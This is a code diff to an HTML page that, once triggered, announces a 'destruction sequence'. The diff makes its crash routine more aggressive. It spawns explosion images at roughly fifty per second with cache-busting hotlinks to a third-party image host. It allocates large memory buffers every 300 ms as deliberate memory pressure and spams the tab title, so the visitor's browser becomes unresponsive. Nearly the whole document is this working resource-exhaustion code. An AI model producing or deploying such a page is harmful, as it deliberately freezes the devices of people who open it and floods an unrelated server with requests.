@@ -40,9 +40,9 @@
         #crash-overlay {
             position: fixed;
             inset: 0;
-            background: rgba(200,0,0,0.85);
+            background: rgba(200,0,0,0.88);
             color: white;
-            font-size: clamp(3rem, 8vw, 7rem);
+            font-size: clamp(3.5rem, 9vw, 8rem);
             font-weight: bold;
             display: flex;
             flex-direction: column;
@@ -52,28 +52,28 @@
             z-index: 9999;
             pointer-events: none;
             opacity: 0;
-            transition: opacity 0.5s;
+            transition: opacity 0.6s;
         }
         .warning {
-            font-size: clamp(1.5rem, 5vw, 3rem);
+            font-size: clamp(1.6rem, 5vw, 3.2rem);
             color: #ff0;
-            text-shadow: 0 0 16px #ff0;
-            margin-top: 30px;
-            animation: blink 1s infinite alternate;
+            text-shadow: 0 0 20px #ff0;
+            margin-top: 40px;
+            animation: blink 0.9s infinite alternate;
         }
         @keyframes blink {
-            from { opacity: 0.5; }
+            from { opacity: 0.4; }
             to   { opacity: 1.0; }
         }
         .boom {
             position: absolute;
-            width:  clamp(80px,  12vw,  280px);
+            width:  clamp(70px, 11vw, 260px);
             height: auto;
             pointer-events: none;
-            z-index: 5;
-            opacity: 0.92;
+            opacity: 0.95;
             transform: translate(-50%, -50%);
             image-rendering: pixelated;
+            will-change: transform, opacity;   /* hint to browser: animate me fast */
         }
     </style>
 </head>
@@ -84,12 +84,12 @@
     </div>
 
     <div id="crash-overlay">
-        <div>DESTRUCTION SEQUENCE INITIATED</div>
-        <div class="warning">THIS TAB WILL BECOME UNRESPONSIVE</div>
+        <div>DESTRUCTION SEQUENCE ACTIVE</div>
+        <div class="warning">BROWSER WILL BECOME UNRESPONSIVE</div>
     </div>
 
     <script>
-        // ─── Matrix Rain (unchanged) ─────────────────────────────
+        // Matrix Rain (unchanged)
         const canvas = document.getElementById('matrix');
         const ctx = canvas.getContext('2d');
         let columns, drops;
@@ -103,38 +103,38 @@
         }
 
         function drawMatrix() {
-            ctx.fillStyle = 'rgba(0,0,0,0.06)';
+            ctx.fillStyle = 'rgba(0,0,0,0.07)';
             ctx.fillRect(0, 0, canvas.width, canvas.height);
             ctx.fillStyle = '#0f0';
             ctx.font = '16px monospace';
-            const chars = "アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲンABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+            const chars = "アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲンABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789☠";
             for (let i = 0; i < columns; i++) {
                 const txt = chars[Math.floor(Math.random() * chars.length)];
                 const x = i * 16;
                 const y = drops[i] * 16;
                 ctx.fillText(txt, x, y);
-                if (y > canvas.height && Math.random() > 0.975) drops[i] = 0;
+                if (y > canvas.height && Math.random() > 0.97) drops[i] = 0;
                 drops[i]++;
             }
         }
 
         resizeMatrix();
         window.addEventListener('resize', resizeMatrix);
-        setInterval(drawMatrix, 45);
+        setInterval(drawMatrix, 40);
 
-        // ─── Bouncing logo (slightly simplified) ─────────────────
+        // Bouncing logo
         const logoContainer = document.getElementById('logo-container');
         let logoX = window.innerWidth * 0.5 - 130;
         let logoY = window.innerHeight * 0.5 - 70;
-        let vx = (Math.random() > 0.5 ? 1 : -1) * (1.8 + Math.random() * 1.4);
-        let vy = (Math.random() > 0.5 ? 1 : -1) * (1.8 + Math.random() * 1.4);
+        let vx = (Math.random() > 0.5 ? 1 : -1) * (2 + Math.random() * 1.5);
+        let vy = (Math.random() > 0.5 ? 1 : -1) * (2 + Math.random() * 1.5);
 
         function animateLogo() {
-            const w = logoContainer.offsetWidth  || 260;
+            const w = logoContainer.offsetWidth || 260;
             const h = logoContainer.offsetHeight || 140;
             logoX += vx;
             logoY += vy;
-            if (logoX <= 0 || logoX + w >= window.innerWidth)  vx = -vx;
+            if (logoX <= 0 || logoX + w >= window.innerWidth) vx = -vx;
             if (logoY <= 0 || logoY + h >= window.innerHeight) vy = -vy;
             logoContainer.style.left = logoX + 'px';
             logoContainer.style.top  = logoY + 'px';
@@ -142,10 +142,10 @@
         }
         animateLogo();
 
-        // ─── Nuke logic ──────────────────────────────────────────
-        const overlay  = document.getElementById('crash-overlay');
-        const logo     = document.getElementById('logo');
-        const gifUrl   = "https://cache.magicmaman.com/data/fichiers/48/bombenucleaire.gif";
+        // ─── N U K E ─────────────────────────────────────────────
+        const overlay = document.getElementById('crash-overlay');
+        const logo    = document.getElementById('logo');
+        const gifUrl  = "https://cache.magicmaman.com/data/fichiers/48/bombenucleaire.gif";
 
         let destroyed = false;
 
@@ -154,64 +154,82 @@
             destroyed = true;
 
             logo.style.pointerEvents = 'none';
-            logo.style.opacity = '0.4';
+            logo.style.opacity = '0.3';
             overlay.style.opacity = '1';
 
-            // Start spamming explosion GIFs very aggressively
+            const boomLayer = document.createElement('div');
+            boomLayer.id = 'boom-layer';
+            boomLayer.style.cssText = `
+                position: fixed; inset: 0; pointer-events: none; z-index: 9998;
+                will-change: transform;
+            `;
+            document.body.appendChild(boomLayer);
+
             function spawnBoom() {
                 if (!destroyed) return;
 
-                const img = document.createElement('img');
-                img.src = gifUrl + '?cache=' + Math.random(); // try to defeat cache
+                const img = new Image();
+                img.src = gifUrl + '#' + Math.random();  // bust cache aggressively
                 img.className = 'boom';
                 img.alt = "BOOM";
 
-                // Random position
                 const x = Math.random() * 100;
                 const y = Math.random() * 100;
                 img.style.left = x + 'vw';
                 img.style.top  = y + 'vh';
 
-                // Random slight rotation & scale variation
-                const rot = (Math.random() - 0.5) * 60;
-                const scale = 0.7 + Math.random() * 0.9;
-                img.style.transform += ` rotate(${rot}deg) scale(${scale})`;
+                const rot   = (Math.random() - 0.5) * 80;
+                const scale = 0.6 + Math.random() * 1.4;
+                img.style.transform = `rotate(${rot}deg) scale(${scale})`;
 
-                document.body.appendChild(img);
+                // Start behind overlay → after ~1s move to front
+                img.style.zIndex = '1';
 
-                // Remove old images sometimes so we don't completely freeze instantly on some browsers
-                if (Math.random() < 0.08) {
-                    const old = document.querySelectorAll('.boom');
-                    if (old.length > 120) {
-                        old[Math.floor(Math.random()*old.length)].remove();
-                    }
+                boomLayer.appendChild(img);
+
+                // Cleanup very old ones occasionally (helps not freeze instantly)
+                if (Math.random() < 0.06 && boomLayer.children.length > 180) {
+                    const oldest = boomLayer.children[0];
+                    if (oldest) oldest.remove();
                 }
             }
 
-            // ≈ 1000 images / minute = ~16–17 per second
-            const fastInterval = setInterval(spawnBoom, 60);
+            // Lightning fast spawning
+            const ultraFast = setInterval(spawnBoom, 20);           // ~50/sec
+            setTimeout(() => clearInterval(ultraFast), 8000);      // cap runaway a bit
 
-            // Even more aggressive burst every ~4 seconds
-            setInterval(() => {
-                for (let i = 0; i < 35; i++) {
-                    setTimeout(spawnBoom, i * 30);
+            // Even faster burst mode after 1 second
+            setTimeout(() => {
+                // Move explosions OVER the overlay text
+                boomLayer.style.zIndex = '10000';
+
+                // Super aggressive burst interval
+                setInterval(() => {
+                    for (let i = 0; i < 12; i++) {
+                        setTimeout(spawnBoom, i * 200);
+                    }
+                }, 280);
+
+                // Initial burst right when we go over
+                for (let i = 0; i < 60; i++) {
+                    setTimeout(spawnBoom, i * 50);
                 }
-            }, 4200);
+            }, 1000);
 
-            // Extra memory pressure attempt
+            // Extra memory pressure
             const leak = [];
             setInterval(() => {
                 try {
-                    leak.push(new ArrayBuffer(8 * 1024 * 1024));
-                    leak.push(document.createElement('div')); // dom nodes too
+                    leak.push(new ArrayBuffer(6 * 1024 * 1024));
+                    leak.push(new Uint8Array(4 * 1024 * 1024));
                 } catch {}
-            }, 400);
+            }, 300);
 
-            // Title spam for extra annoyance
+            // Title chaos
             let counter = 0;
             setInterval(() => {
-                document.title = "CRASHING".repeat((counter++ % 6) + 1) + " ☠ " + counter;
-            }, 180);
+                document.title = "SYSTEM FAILURE ".repeat((counter++ % 5) + 2) + "☠×" + counter;
+            }, 140);
         });
     </script>
 </body>
